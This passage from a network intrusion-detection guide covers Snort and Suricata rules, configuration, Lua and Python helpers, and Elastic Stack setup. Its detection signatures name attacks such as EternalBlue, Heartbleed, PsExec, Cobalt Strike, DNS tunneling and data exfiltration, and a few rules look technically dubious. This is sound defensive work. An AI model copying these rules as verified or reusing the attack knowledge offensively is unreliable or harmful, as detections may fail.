# Detect email addresses with specific TLD patterns
alert tcp any any -> any 25 (msg:"Email to Suspicious TLD"; \
    flow:to_server,established; \
    content:"RCPT TO:"; nocase; \
    pcre:"/RCPT\s+TO:\s*<[^@]+@[^\.]+\.(tk|ml|ga|cf|gq)>/i"; \
    sid:1000051; rev:1; \
    classtype:suspicious-filename-detect;)
```

**Flowbits for Stateful Detection**

```bash
# Multi-stage attack detection
# Stage 1: Initial reconnaissance
alert tcp any any -> any 80 (msg:"Stage 1 - Web Directory Enumeration"; \
    flow:to_server,established; \
    content:"GET"; http_method; \
    content:"/admin"; http_uri; \
    flowbits:set,web.recon; \
    flowbits:noalert; \
    sid:1000060; rev:1;)

# Stage 2: Exploitation attempt following recon
alert tcp any any -> any 80 (msg:"Stage 2 - Exploitation Following Recon"; \
    flow:to_server,established; \
    flowbits:isset,web.recon; \
    content:"POST"; http_method; \
    content:"/upload"; http_uri; \
    content:"php"; http_client_body; nocase; \
    sid:1000061; rev:1; \
    classtype:web-application-attack; \
    priority:1;)
```

**Threshold and Suppression**

```bash
# Rate-based detection for port scanning
alert tcp any any -> any any (msg:"Potential Port Scan Detected"; \
    flags:S; \
    threshold:type threshold, track by_src, count 20, seconds 10; \
    sid:1000070; rev:1; \
    classtype:attempted-recon;)

# Detect brute force attacks
alert tcp any any -> any 22 (msg:"SSH Brute Force Attempt"; \
    flow:to_server,established; \
    content:"SSH-"; depth:4; \
    threshold:type threshold, track by_dst, count 5, seconds 60; \
    sid:1000071; rev:1; \
    classtype:attempted-admin;)

# Limit false positives with threshold
alert tcp any any -> any 443 (msg:"TLS Certificate Error"; \
    flow:established; \
    ssl_state:server_hello; \
    threshold:type limit, track by_src, count 1, seconds 300; \
    sid:1000072; rev:1; \
    classtype:protocol-command-decode;)
```

### Protocol-Aware Detection

**HTTP Inspection Keywords**

```bash
# HTTP method validation
alert tcp any any -> any 80 (msg:"Unusual HTTP Method Detected"; \
    flow:to_server,established; \
    content:!"GET"; http_method; \
    content:!"POST"; http_method; \
    content:!"HEAD"; http_method; \
    content:!"PUT"; http_method; \
    content:!"DELETE"; http_method; \
    sid:1000080; rev:1; \
    classtype:protocol-command-decode;)

# URI obfuscation detection
alert tcp any any -> any 80 (msg:"HTTP URI Encoding Evasion"; \
    flow:to_server,established; \
    content:"GET"; http_method; \
    urilen:>200; \
    pcre:"/(%[0-9a-fA-F]{2}){10,}/"; \
    sid:1000081; rev:1; \
    classtype:web-application-attack;)

# Host header injection
alert tcp any any -> any 80 (msg:"HTTP Host Header Injection Attempt"; \
    flow:to_server,established; \
    content:"Host|3a 20|"; http_header; \
    pcre:"/Host:\s+[^\r\n]*[\r\n]+[^\r\n]+:/H"; \
    sid:1000082; rev:1; \
    classtype:web-application-attack;)
```

**SSL/TLS Detection**

```bash
# Detect Heartbleed exploitation attempts (CVE-2014-0160)
alert tcp any any -> any 443 (msg:"Heartbleed Exploitation Attempt"; \
    flow:to_server,established; \
    content:"|18 03|"; offset:0; depth:2; \
    byte_test:2,>,0x0200,3,relative; \
    content:"|01|"; distance:0; within:1; \
    sid:1000090; rev:1; \
    reference:cve,2014-0160; \
    classtype:attempted-admin; \
    priority:1;)

# Detect SSLv3 usage (POODLE vulnerability)
alert tcp any any -> any 443 (msg:"SSLv3 Connection Attempt - POODLE Vulnerable"; \
    flow:to_server,established; \
    content:"|16 03 00|"; depth:3; \
    sid:1000091; rev:1; \
    reference:cve,2014-3566; \
    classtype:protocol-command-decode;)
```

**SMB/CIFS Detection**

```bash
# Detect EternalBlue exploitation (MS17-010)
alert tcp any any -> any 445 (msg:"EternalBlue SMB Exploitation Attempt"; \
    flow:to_server,established; \
    content:"|ff|SMB|33|"; offset:4; depth:5; \
    byte_test:2,>,0x1000,26,relative; \
    content:"|fe 53 4d 42|"; within:1000; \
    sid:1000100; rev:1; \
    reference:cve,2017-0144; \
    classtype:attempted-admin; \
    priority:1;)

# Detect PsExec lateral movement
alert tcp any any -> any 445 (msg:"PsExec Service Installation Detected"; \
    flow:to_server,established; \
    content:"|ff|SMB|a2|"; offset:4; depth:5; \
    content:"PSEXESVC"; distance:0; nocase; \
    sid:1000101; rev:1; \
    classtype:trojan-activity;)
```

### Rule Management and Organization

**Local Rules File Structure**

```bash
# /etc/snort/rules/local.rules
# Organized by attack category

# ==============================
# Network Reconnaissance Rules
# ==============================
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Sweep"; \
    itype:8; \
    threshold:type threshold, track by_src, count 10, seconds 5; \
    sid:1100001; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"TCP SYN Scan"; \
    flags:S; \
    threshold:type threshold, track by_src, count 20, seconds 10; \
    sid:1100002; rev:1;)

# ==============================
# Web Application Attacks
# ==============================
alert tcp any any -> $HOME_NET 80 (msg:"Directory Traversal Attempt"; \
    flow:to_server,established; \
    content:"../"; http_uri; \
    pcre:"/(\.\.[\/\\]){3,}/U"; \
    sid:1200001; rev:1;)

# ==============================
# Malware Communication
# ==============================
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Cobalt Strike Beacon"; \
    flow:established,to_server; \
    content:"|00 00 00 01 00 00 40 00|"; offset:0; depth:8; \
    sid:1300001; rev:1; \
    reference:url,attack.mitre.org/software/S0154;)
```

**Variable Configuration**

```bash
# /etc/snort/snort.conf

# Network variables
ipvar HOME_NET [192.168.1.0/24,10.0.0.0/8]
ipvar EXTERNAL_NET !$HOME_NET
ipvar DMZ_NET 172.16.0.0/24

# Port variables
portvar HTTP_PORTS [80,8080,8000,8888]
portvar ORACLE_PORTS [1521,1522,1525]
portvar SSH_PORTS [22,2222]

# Path variables
var RULE_PATH /etc/snort/rules
var SO_RULE_PATH /etc/snort/so_rules
var PREPROC_RULE_PATH /etc/snort/preproc_rules

# Include custom rules
include $RULE_PATH/local.rules
include $RULE_PATH/emerging-threats.rules
```

### Testing and Validation

**Rule Syntax Verification**

```bash
# Test rule syntax without running IDS
snort -T -c /etc/snort/snort.conf

# Test specific rule file
snort -T -c /etc/snort/snort.conf -R /etc/snort/rules/local.rules

# Enable verbose output for debugging
snort -T -c /etc/snort/snort.conf -v
```

**Rule Testing with PCAP**

```bash
# Replay traffic against rules
snort -c /etc/snort/snort.conf -r test_traffic.pcap -A console

# Test specific rule with SID
snort -c /etc/snort/snort.conf -r test_traffic.pcap -A console --alert-on-ip

# Generate detailed alert output
snort -c /etc/snort/snort.conf -r test_traffic.pcap -A full -l /var/log/snort/test/
```

**Performance Tuning**

```bash
# Profile rule performance
snort -c /etc/snort/snort.conf --rule-perf-file /var/log/snort/rule_perf.txt

# Analyze rule performance
sort -k6 -nr /var/log/snort/rule_perf.txt | head -20

# Output format: SID, checks, matches, alerts, microseconds, avg_check_time
```

### Dynamic Rule Generation

**Python Script for Rule Generation**

```python
#!/usr/bin/env python3
# generate_ioc_rules.py - Generate Snort rules from IOC list

import sys
import argparse
from datetime import datetime

def generate_ip_rule(ioc_data):
    """Generate rule for malicious IP"""
    template = '''alert ip $HOME_NET any -> {ip} any (msg:"Connection to Known Malicious IP - {description}"; \
    sid:{sid}; rev:1; \
    reference:url,{reference}; \
    classtype:trojan-activity; \
    metadata:created {date};)'''
    
    return template.format(
        ip=ioc_data['ip'],
        description=ioc_data.get('description', 'Unknown threat'),
        sid=ioc_data['sid'],
        reference=ioc_data.get('reference', 'internal-ioc-feed'),
        date=datetime.utcnow().strftime('%Y-%m-%d')
    )

def generate_domain_rule(ioc_data):
    """Generate rule for malicious domain"""
    template = '''alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"HTTP Request to Malicious Domain - {domain}"; \
    flow:to_server,established; \
    content:"Host|3a 20|"; http_header; \
    content:"{domain}"; http_header; nocase; \
    sid:{sid}; rev:1; \
    reference:url,{reference}; \
    classtype:trojan-activity;)'''
    
    return template.format(
        domain=ioc_data['domain'],
        sid=ioc_data['sid'],
        reference=ioc_data.get('reference', 'internal-ioc-feed')
    )

def generate_hash_rule(ioc_data):
    """Generate rule for file hash (via HTTP transfer)"""
    # [Inference] This detects based on common patterns, not actual hash matching
    template = '''alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Malware Hash Detected in Transfer - {hash}"; \
    flow:established,to_client; \
    content:"|4d 5a|"; offset:0; depth:2; \
    file_data; \
    sid:{sid}; rev:1; \
    reference:url,{reference}; \
    classtype:trojan-activity;)'''
    
    # Note: Actual hash matching requires Snort 3 or external processing
    return f"# Hash-based detection requires file extraction: {ioc_data['hash']}"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generate Snort rules from IOCs')
    parser.add_argument('--ioc-file', required=True, help='JSON file with IOC data')
    parser.add_argument('--output', required=True, help='Output rules file')
    parser.add_argument('--start-sid', type=int, default=2000000, help='Starting SID')
    
    args = parser.parse_args()
    
    import json
    with open(args.ioc_file) as f:
        iocs = json.load(f)
    
    sid_counter = args.start_sid
    
    with open(args.output, 'w') as out:
        out.write(f"# Auto-generated rules from IOC feed\n")
        out.write(f"# Generated: {datetime.utcnow().isoformat()}\n\n")
        
        for ioc in iocs:
            ioc['sid'] = sid_counter
            
            if 'ip' in ioc:
                rule = generate_ip_rule(ioc)
            elif 'domain' in ioc:
                rule = generate_domain_rule(ioc)
            elif 'hash' in ioc:
                rule = generate_hash_rule(ioc)
            else:
                continue
            
            out.write(rule + '\n\n')
            sid_counter += 1
    
    print(f"Generated {sid_counter - args.start_sid} rules")
```

---

## Suricata Configuration

### Suricata Architecture Differences from Snort

**Multi-Threading Support** Suricata natively supports multi-core processors:

- Packet acquisition threads
- Detection threads per core
- Output threads for logging
- Flow management threads

**Protocol Parsers** Built-in deep packet inspection for:

- HTTP/HTTPS with file extraction
- TLS certificate parsing
- SMB/DCERPC
- DNS with logging of all query types
- SSH, FTP, SMTP protocols
- Kerberos, NFS, TFTP, DHCP

### Basic Configuration

**Primary Configuration File**

```yaml
# /etc/suricata/suricata.yaml

%YAML 1.1
---

# Global stats configuration
stats:
  enabled: yes
  interval: 30

# Configure network interfaces
af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    threads: auto

# Network address groups
vars:
  address-groups:
    HOME_NET: "[192.168.1.0/24,10.0.0.0/8]"
    EXTERNAL_NET: "!$HOME_NET"
    HTTP_SERVERS: "$HOME_NET"
    SMTP_SERVERS: "$HOME_NET"
    SQL_SERVERS: "$HOME_NET"
    DNS_SERVERS: "$HOME_NET"
    
  port-groups:
    HTTP_PORTS: "80"
    SHELLCODE_PORTS: "!80"
    ORACLE_PORTS: "1521"
    SSH_PORTS: "22"

# Logging outputs
outputs:
  - fast:
      enabled: yes
      filename: fast.log
      append: yes
  
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert:
            payload: yes
            metadata: yes
        - http:
            extended: yes
        - dns:
            query: yes
            answer: yes
        - tls:
            extended: yes
        - files:
            force-magic: yes
        - ssh:
            enabled: yes
        - stats:
            totals: yes
            threads: yes

# Application layer protocols
app-layer:
  protocols:
    http:
      enabled: yes
      memcap: 128mb
    tls:
      enabled: yes
      detection-ports:
        dp: 443
    dns:
      tcp:
        enabled: yes
      udp:
        enabled: yes
    ssh:
      enabled: yes
    smb:
      enabled: yes
      detection-ports:
        dp: 139,445

# Performance tuning
threading:
  set-cpu-affinity: no
  cpu-affinity:
    - management-cpu-set:
        cpu: [ 0 ]
    - receive-cpu-set:
        cpu: [ 0 ]
    - worker-cpu-set:
        cpu: [ "all" ]
  detect-thread-ratio: 1.0

# Flow settings
flow:
  memcap: 256mb
  hash-size: 65536
  prealloc: 10000
  emergency-recovery: 30

# Defragmentation
defrag:
  memcap: 64mb
  hash-size: 65536
  prealloc: yes

# Stream reassembly
stream:
  memcap: 256mb
  checksum-validation: yes
  inline: auto
  reassembly:
    memcap: 512mb
    depth: 1mb
    toserver-chunk-size: 2560
    toclient-chunk-size: 2560

# Rule files
default-rule-path: /etc/suricata/rules
rule-files:
  - suricata.rules
  - custom.rules
  - emerging-threats.rules
```

### Suricata-Specific Rule Features

**File Extraction and Inspection**

```bash
# Extract and log HTTP files
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Executable Download"; \
    flow:established,to_client; \
    fileext:"exe"; \
    filemagic:"PE32 executable"; \
    filestore:force,both,md5,sha1,sha256; \
    sid:3000001; rev:1;)

# Detect specific file content
alert http any any -> any any (msg:"Malicious PDF with Embedded JavaScript"; \
    flow:established; \
    fileext:"pdf"; \
    file_data; \
    content:"/JavaScript"; \
    content:"/OpenAction"; distance:0; within:500; \
    sid:3000002; rev:1; \
    reference:url,attack.mitre.org/techniques/T1203;)

# Monitor file transfer sizes
alert http any any -> $HOME_NET any (msg:"Large File Transfer - Possible Data Exfiltration"; \
    flow:established,to_server; \
    filesize:>10000000; \
    threshold:type threshold, track by_src, count 3, seconds 300; \
    sid:3000003; rev:1;)
```

**HTTP Logging and Keywords**

```bash
# Enhanced HTTP metadata logging
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Suspicious User-Agent String"; \
    flow:established,to_server; \
    http.user_agent; content:"sqlmap"; nocase; \
    http.method; content:"POST"; \
    http.uri; content:".php"; \
    sid:3000010; rev:1;)

# HTTP response code detection
alert http any any -> $HOME_NET any (msg:"HTTP 401 Unauthorized - Possible Auth Bypass Attempt"; \
    flow:established,to_client; \
    http.stat_code; content:"401"; \
    threshold:type threshold, track by_dst, count 10, seconds 60; \
    sid:3000011; rev:1;)

# Cookie theft detection
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"HTTP Response with Session Cookie"; \
    flow:established,to_client; \
    http.header; content:"Set-Cookie"; nocase; \
    content:"sessionid"; nocase; distance:0; \
    http.header; content:"secure"; nocase; \
    sid:3000012; rev:1;)
```

**TLS/SSL Certificate Inspection**

```bash
# Detect self-signed certificates
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"Self-Signed SSL Certificate"; \
    flow:established,to_client; \
    tls.cert_subject; content:"CN="; \
    tls.cert_issuer; content:"CN="; \
    byte_test:0,=,0,0,relative; \
    sid:3000020; rev:1;)

# Monitor certificate expiration
alert tls any any -> any any (msg:"Expired SSL Certificate"; \
    tls.cert_expired; \
    sid:3000021; rev:1; \
    classtype:protocol-command-decode;)

# Detect certificate subject anomalies
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"TLS Certificate with Suspicious CN"; \
    flow:established; \
    tls.subject; content:"localhost"; nocase; \
    sid:3000022; rev:1;)

# JA3 fingerprint detection (requires ja3 support)
# [Unverified: Requires compilation with ja3 support]
alert tls any any -> any any (msg:"Known Malicious JA3 Hash"; \
    ja3.hash; content:"e7d705a3286e19ea42f587b344ee6865"; \
    sid:3000023; rev:1; \
    reference:url,github.com/salesforce/ja3;)
```

**DNS Query Logging**

```bash
# Detect DNS tunneling by query length
alert dns $HOME_NET any -> any 53 (msg:"DNS Tunneling - Excessive Subdomain Depth"; \
    dns.query; content:"."; \
    isdataat:!100,relative; \
    pcre:"/^([a-z0-9-]+\.){10,}/i"; \
    sid:3000030; rev:1;)

# Monitor for DGA (Domain Generation Algorithm) patterns
alert dns any any -> any 53 (msg:"Possible DGA Domain Query"; \
    dns.query; \
    pcre:"/^[a-z]{20,}\.[a-z]{2,}$/i"; \
    sid:3000031; rev:1; \
    reference:url,attack.mitre.org/techniques/T1568;)

# Detect DNS queries to recently registered domains
# [Inference: Requires external threat intelligence feed integration]
alert dns $HOME_NET any -> any 53 (msg:"Query to Recently Registered Domain"; \
    dns.query; \
    dataset:isset,recently-registered-domains; \
    sid:3000032; rev:1;)
```

**SMB/CIFS Protocol Detection**

```bash
# Detect SMB named pipe usage (lateral movement indicator)
alert smb any any -> $HOME_NET 445 (msg:"SMB Named Pipe Access - Possible Lateral Movement"; \
    flow:established,to_server; \
    smb.named_pipe; content:"svcctl"; \
    sid:3000040; rev:1; \
    reference:url,attack.mitre.org/techniques/T1021/002;)

# Detect NTLM authentication
alert smb any any -> any 445 (msg:"NTLM Authentication Detected"; \
    flow:established; \
    smb.ntlmssp; \
    sid:3000041; rev:1;)

# Monitor for large file transfers over SMB
alert smb any any -> $HOME_NET 445 (msg:"Large SMB File Transfer"; \
    flow:established; \
    smb.share; \
    filesize:>50000000; \
    sid:3000042; rev:1;)
```

### Dataset Support for Dynamic Lists

**Creating and Using Datasets**

```bash
# Create dataset directory
mkdir -p /var/lib/suricata/data

# Create dataset of malicious IPs
cat > /var/lib/suricata/data/malicious-ips.lst << EOF
192.0.2.100
198.51.100.50
203.0.113.75
EOF

# Create dataset configuration in rules
# /etc/suricata/rules/datasets.rules
alert ip $HOME_NET any -> any any (msg:"Connection to Known Malicious IP"; \
    ip.dst; dataset:isset,malicious-ips,type ip,load /var/lib/suricata/data/malicious-ips.lst; \
    sid:3000050; rev:1;)

# String-based dataset for domain matching
alert dns $HOME_NET any -> any 53 (msg:"DNS Query to Malicious Domain"; \
    dns.query; \
    dataset:isset,malicious-domains,type string,load /var/lib/suricata/data/malicious-domains.lst; \
    sid:3000051; rev:1;)
```

**Dynamic Dataset Updates**

```python
#!/usr/bin/env python3
# update_suricata_datasets.py

import requests
import subprocess
from pathlib import Path

DATASET_DIR = Path('/var/lib/suricata/data')
THREAT_FEED_URL = 'https://example.com/threat-feed.json'

def update_ip_dataset():
    """Download and update malicious IP dataset"""
    response = requests.get(THREAT_FEED_URL, timeout=30)
    threat_data = response.json()
    
    ips = [item['ip'] for item in threat_data if 'ip' in item]
    
    dataset_file = DATASET_DIR / 'malicious-ips.lst'
    with open(dataset_file, 'w') as f:
        f.write('\n'.join(ips))
    
    # Reload Suricata rules
    subprocess.run(['suricatasc', '-c', 'reload-rules'], check=True)
    
    print(f"Updated dataset with {len(ips)} IPs")

if __name__ == '__main__':
    update_ip_dataset()
```

### Lua Scripting for Complex Logic

**Custom Detection with Lua**

```lua
-- /etc/suricata/lua-scripts/detect_anomaly.lua
-- Advanced anomaly detection logic

function match(args)
    local p = args["packet"]
    
    -- Get packet size
    local size = p:get_size()
    
    -- Detect beacon-like traffic (consistent packet sizes)
    local counter = SCFlowVar("counter")
    if counter == nil then
        counter = 1
        SCFlowVarSet("counter", counter)
    else
        counter = counter + 1
        SCFlowVarSet("counter", counter)
    end
    
    -- Alert if consistent packet sizes over multiple packets
    if counter > 10 and size >= 100 and size <= 150 then
        return 1  -- Match
    end
    
    return 0  -- No match
end

function deinit()
    -- Cleanup
end
```

**Using Lua Scripts in Rules**

```bash
# Rule invoking Lua script
alert tcp any any -> any any (msg:"Beacon-like Traffic Pattern Detected"; \
    flow:established; \
    luajit:detect_anomaly.lua; \
    threshold:type limit, track by_flow, count 1, seconds 300; \
    sid:3000060; rev:1; \
    classtype:trojan-activity;)

# Lua script for custom protocol parsing
alert tcp any any -> any 1337 (msg:"Custom Protocol Anomaly"; \
    flow:established; \
    luajit:custom_protocol_check.lua; \
    sid:3000061; rev:1;)
```

**Advanced Lua Example: DNS Response Time Analysis**

```lua
-- /etc/suricata/lua-scripts/dns_timing.lua

function init(args)
    local needs = {}
    needs["dns.request"] = tostring(true)
    needs["dns.response"] = tostring(true)
    needs["flowvar"] = {"request_time"}
    return needs
end

function match(args)
    if args["dns.request"] then
        -- Store timestamp of DNS request
        local ts = SCPacketTimestamp()
        SCFlowVarSet("request_time", ts)
        return 0
    end
    
    if args["dns.response"] then
        -- Calculate response time
        local request_ts = SCFlowVar("request_time")
        if request_ts ~= nil then
            local response_ts = SCPacketTimestamp()
            local diff = response_ts - request_ts
            
            -- Alert on suspiciously fast responses (cached tunneling)
            if diff < 0.001 then  -- Less than 1ms
                return 1
            end
            
            -- Alert on suspiciously slow responses (DNS tunneling)
            if diff > 5.0 then  -- More than 5 seconds
                return 1
            end
        end
    end
    
    return 0
end
```

### Performance Optimization

**Multi-Threading Configuration**

```yaml
# /etc/suricata/suricata.yaml - Performance section

threading:
  set-cpu-affinity: yes
  cpu-affinity:
    - management-cpu-set:
        cpu: [ 0 ]
    - receive-cpu-set:
        cpu: [ 1,2 ]
    - worker-cpu-set:
        cpu: [ 3,4,5,6,7,8 ]
    - verdict-cpu-set:
        cpu: [ 9,10 ]
  
  detect-thread-ratio: 1.5

# Packet acquisition optimization
af-packet:
  - interface: eth0
    threads: 4
    cluster-id: 99
    cluster-type: cluster_qm
    defrag: yes
    use-mmap: yes
    ring-size: 200000
    block-size: 32768

# Memory optimization
flow:
  memcap: 1gb
  hash-size: 131072
  prealloc: 100000
  emergency-recovery: 25

stream:
  memcap: 2gb
  checksum-validation: yes
  reassembly:
    memcap: 2gb
    depth: 2mb
```

**Rule Performance Profiling**

```bash
# Enable rule profiling in suricata.yaml
profiling:
  rules:
    enabled: yes
    filename: rule_perf.log
    append: yes
    sort: avgticks
    limit: 100

# Run Suricata with profiling
suricata -c /etc/suricata/suricata.yaml -i eth0

# Analyze rule performance
tail -100 /var/log/suricata/rule_perf.log | column -t

# Output shows: SID, Checks, Matches, Max ticks, Avg ticks, Total ticks
```

### Rule Management and Updates

**Suricata-Update Tool**

```bash
# Install suricata-update
pip3 install suricata-update

# Initialize configuration
suricata-update update-sources

# List available rule sources
suricata-update list-sources

# Enable Emerging Threats Open ruleset
suricata-update enable-source et/open

# Enable additional sources
suricata-update enable-source oisf/trafficid
suricata-update enable-source sslbl/ssl-fp-blacklist

# Update all enabled sources
suricata-update

# Update with custom configuration
suricata-update --suricata /usr/bin/suricata \
                --suricata-conf /etc/suricata/suricata.yaml \
                --output /etc/suricata/rules

# Reload rules without restart
suricatasc -c reload-rules
```

**Custom Source Configuration**

```yaml
# /etc/suricata/update.yaml

sources:
  custom-feed:
    summary: Internal threat intelligence feed
    url: https://internal-server/threat-rules.tar.gz
    
disable-conf: /etc/suricata/disable.conf
enable-conf: /etc/suricata/enable.conf
modify-conf: /etc/suricata/modify.conf

# Filter configuration
filters:
  - "drop icmp"  # Convert all ICMP alerts to drops
  - "modifysid * 'classtype:attempted-admin' | 'classtype:successful-admin'"
```

**Automated Rule Updates with Cron**

```bash
# /etc/cron.d/suricata-update
# Update rules daily at 2 AM

0 2 * * * suricata suricata-update && suricatasc -c reload-rules

# Create update script with validation
cat > /usr/local/bin/suricata-safe-update.sh << 'EOF'
#!/bin/bash

set -e

LOG_FILE="/var/log/suricata/rule-update.log"
BACKUP_DIR="/var/backups/suricata-rules"

echo "$(date): Starting rule update" >> "$LOG_FILE"

# Backup current rules
mkdir -p "$BACKUP_DIR"
tar -czf "$BACKUP_DIR/rules-$(date +%Y%m%d-%H%M%S).tar.gz" /etc/suricata/rules/

# Update rules
suricata-update >> "$LOG_FILE" 2>&1

# Test configuration
if suricata -T -c /etc/suricata/suricata.yaml >> "$LOG_FILE" 2>&1; then
    echo "$(date): Configuration valid, reloading rules" >> "$LOG_FILE"
    suricatasc -c reload-rules >> "$LOG_FILE" 2>&1
    echo "$(date): Rules reloaded successfully" >> "$LOG_FILE"
else
    echo "$(date): Configuration test failed, rolling back" >> "$LOG_FILE"
    # Restore from backup
    LATEST_BACKUP=$(ls -t "$BACKUP_DIR"/*.tar.gz | head -1)
    tar -xzf "$LATEST_BACKUP" -C /
    echo "$(date): Rolled back to previous rules" >> "$LOG_FILE"
    exit 1
fi
EOF

chmod +x /usr/local/bin/suricata-safe-update.sh
```

### EVE JSON Output Processing

**EVE Log Format**

```json
{
  "timestamp": "2025-10-20T14:30:45.123456+0000",
  "flow_id": 1234567890,
  "event_type": "alert",
  "src_ip": "192.168.1.100",
  "src_port": 54321,
  "dest_ip": "203.0.113.50",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 3000001,
    "rev": 1,
    "signature": "Suspicious TLS Connection",
    "category": "Potential Corporate Privacy Violation",
    "severity": 2,
    "metadata": {
      "created_at": ["2025_01_15"],
      "updated_at": ["2025_10_15"]
    }
  },
  "http": {
    "hostname": "malicious.example.com",
    "url": "/payload.exe",
    "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 200,
    "length": 524288
  },
  "tls": {
    "subject": "CN=malicious.example.com",
    "issuerdn": "CN=FakeCA",
    "fingerprint": "aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd"
  },
  "payload": "R0VUIC9wYXlsb2FkLmV4ZSBIVFRQLzEuMQ==",
  "payload_printable": "GET /payload.exe HTTP/1.1",
  "stream": 0,
  "packet": "0x1234567890abcdef..."
}
```

**Python Script for EVE Processing**

```python
#!/usr/bin/env python3
# process_eve_logs.py - Real-time EVE log analysis

import json
import sys
from collections import defaultdict
from datetime import datetime

class SuricataEVEProcessor:
    def __init__(self):
        self.alert_counts = defaultdict(int)
        self.src_ip_stats = defaultdict(lambda: {'alerts': 0, 'sids': set()})
        self.suspicious_flows = []
    
    def process_alert(self, event):
        """Process alert events"""
        sid = event['alert']['signature_id']
        src_ip = event['src_ip']
        
        self.alert_counts[sid] += 1
        self.src_ip_stats[src_ip]['alerts'] += 1
        self.src_ip_stats[src_ip]['sids'].add(sid)
        
        # Identify high-risk flows
        if event['alert']['severity'] <= 2:
            self.suspicious_flows.append({
                'timestamp': event['timestamp'],
                'src_ip': src_ip,
                'dest_ip': event['dest_ip'],
                'signature': event['alert']['signature']
            })
    
    def process_http(self, event):
        """Extract HTTP indicators"""
        if 'http' in event:
            http = event['http']
            # Log suspicious user agents
            ua = http.get('http_user_agent', '')
            if any(tool in ua.lower() for tool in ['sqlmap', 'nikto', 'nmap']):
                print(f"[!] Suspicious User-Agent from {event['src_ip']}: {ua}")
    
    def process_dns(self, event):
        """Analyze DNS queries"""
        if 'dns' in event and event['dns'].get('type') == 'query':
            query = event['dns']['rrname']
            # Detect potential DGA domains
            if len(query) > 30 and query.count('.') > 5:
                print(f"[!] Possible DNS tunneling: {query} from {event['src_ip']}")
    
    def process_tls(self, event):
        """Analyze TLS connections"""
        if 'tls' in event:
            tls = event['tls']
            # Check for self-signed certificates
            if tls.get('subject') == tls.get('issuerdn'):
                print(f"[!] Self-signed certificate: {tls['subject']} "
                      f"({event['dest_ip']})")
    
    def generate_report(self):
        """Generate summary report"""
        print("\n" + "="*60)
        print("SURICATA EVE LOG ANALYSIS REPORT")
        print("="*60)
        
        print(f"\nTotal Unique Alerts: {len(self.alert_counts)}")
        print("\nTop 10 Triggered Signatures:")
        sorted_alerts = sorted(self.alert_counts.items(), 
                              key=lambda x: x[1], reverse=True)
        for sid, count in sorted_alerts[:10]:
            print(f"  SID {sid}: {count} alerts")
        
        print(f"\nTop Source IPs by Alert Count:")
        sorted_ips = sorted(self.src_ip_stats.items(),
                           key=lambda x: x[1]['alerts'], reverse=True)
        for ip, stats in sorted_ips[:10]:
            print(f"  {ip}: {stats['alerts']} alerts, "
                  f"{len(stats['sids'])} unique signatures")
        
        print(f"\nHigh-Risk Flows: {len(self.suspicious_flows)}")
        for flow in self.suspicious_flows[:5]:
            print(f"  {flow['timestamp']}: {flow['src_ip']} -> "
                  f"{flow['dest_ip']} - {flow['signature']}")

def main():
    if len(sys.argv) != 2:
        print("Usage: process_eve_logs.py <eve.json>")
        sys.exit(1)
    
    processor = SuricataEVEProcessor()
    
    with open(sys.argv[1]) as f:
        for line in f:
            try:
                event = json.loads(line)
                event_type = event.get('event_type')
                
                if event_type == 'alert':
                    processor.process_alert(event)
                elif event_type == 'http':
                    processor.process_http(event)
                elif event_type == 'dns':
                    processor.process_dns(event)
                elif event_type == 'tls':
                    processor.process_tls(event)
                    
            except json.JSONDecodeError:
                continue
    
    processor.generate_report()

if __name__ == '__main__':
    main()
```

**Real-Time EVE Monitoring with jq**

```bash
# Monitor alerts in real-time
tail -f /var/log/suricata/eve.json | \
    jq -r 'select(.event_type=="alert") | 
    "\(.timestamp) | \(.src_ip):\(.src_port) -> \(.dest_ip):\(.dest_port) | \(.alert.signature)"'

# Extract unique malicious IPs
jq -r 'select(.event_type=="alert" and .alert.severity<=2) | .dest_ip' \
    /var/log/suricata/eve.json | sort -u

# Count alerts by signature
jq -r 'select(.event_type=="alert") | .alert.signature' \
    /var/log/suricata/eve.json | sort | uniq -c | sort -rn

# Extract HTTP requests with specific response codes
jq -r 'select(.event_type=="http" and .http.status==404) | 
    "\(.src_ip) - \(.http.hostname)\(.http.url)"' \
    /var/log/suricata/eve.json
```

---

## Elastic Stack Integration

### Architecture Overview

**ELK Stack Components**

- **Elasticsearch**: Distributed search and analytics engine for log storage
- **Logstash**: Server-side data processing pipeline for ingestion
- **Kibana**: Visualization and exploration interface
- **Filebeat**: Lightweight log shipper (alternative to Logstash for simple forwarding)

**Integration Flow**

```
Suricata/Snort → EVE JSON/Unified2 → Filebeat/Logstash → Elasticsearch → Kibana
```

### Elasticsearch Configuration

**Installation and Basic Setup**

```bash
# Install Elasticsearch (Debian/Ubuntu)
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt update && sudo apt install elasticsearch

# Configure Elasticsearch
sudo vi /etc/elasticsearch/elasticsearch.yml
```

**elasticsearch.yml Configuration**

```yaml
# /etc/elasticsearch/elasticsearch.yml

cluster.name: security-monitoring
node.name: node-1

# Network settings
network.host: 0.0.0.0
http.port: 9200

# Discovery settings (single node)
discovery.type: single-node

# Memory settings
bootstrap.memory_lock: true

# Index settings
action.auto_create_index: true

# Security settings
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
```

**JVM Heap Configuration**

```bash
